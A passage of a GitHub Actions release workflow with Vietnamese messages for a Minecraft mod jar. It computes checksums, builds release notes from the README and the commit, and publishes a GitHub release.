      - uses: actions/download-artifact@v4
        with:
          pattern: 'crashmod-jar'
          path: dist
          merge-multiple: true

      - name: Checksum
        run: |
          set -euo pipefail
          mkdir -p dist && cd dist
          ls *.jar >/dev/null || { echo "!! khong co jar"; exit 1; }
          sha256sum *.jar > checksums.txt
          cat checksums.txt

      - name: Notes (lay README + them phan build)
        run: |
          set -euo pipefail
          mkdir -p dist
          cp src-artifact/README.md dist/NOTES.md
          cat >> dist/NOTES.md <<'EOF'

          ---

          ## Ban build nay
          EOF
          printf -- "- MC 1.21.11 | commit \`%s\` | smoke test: %s\n" \
            "$(echo "${GITHUB_SHA}" | cut -c1-7)" "${{ needs.decide.outputs.smoke }}" >> dist/NOTES.md
          printf -- "- File: xem \`checksums.txt\`\n" >> dist/NOTES.md

      - uses: softprops/action-gh-release@v2
        with:
          tag_name: ${{ steps.meta.outputs.tag }}
          name: ${{ steps.meta.outputs.name }}
          body_path: dist/NOTES.md
          prerelease: ${{ steps.meta.outputs.pre }}
          make_latest: ${{ steps.meta.outputs.latest }}
          fail_on_unmatched_files: true
          files: |
            dist/*.jar
            dist/checksums.txt
